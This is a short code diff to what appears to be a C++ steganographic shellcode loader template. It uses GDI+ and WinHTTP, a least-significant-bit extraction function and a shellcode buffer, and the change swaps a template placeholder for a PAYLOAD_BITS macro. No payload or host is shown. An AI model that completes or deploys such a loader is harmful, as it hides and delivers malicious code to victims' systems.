@@ -2,6 +2,7 @@
 #include <gdiplus.h>
 #include <winhttp.h>
 #include <string>
+#define PAYLOAD_BITS {{ PAYLOAD_BITS }}
 #pragma comment(lib,"gdiplus.lib")
 #pragma comment(lib, "winhttp.lib")
 
@@ -14,7 +15,7 @@ char get_lsb(char target, char source) {
 
 
 
-const int shellcode_len = {{ PAYLOAD_BITS }};
+const int shellcode_len = PAYLOAD_BITS;
 char* payload_data = new char[shellcode_len / 8];
 
 
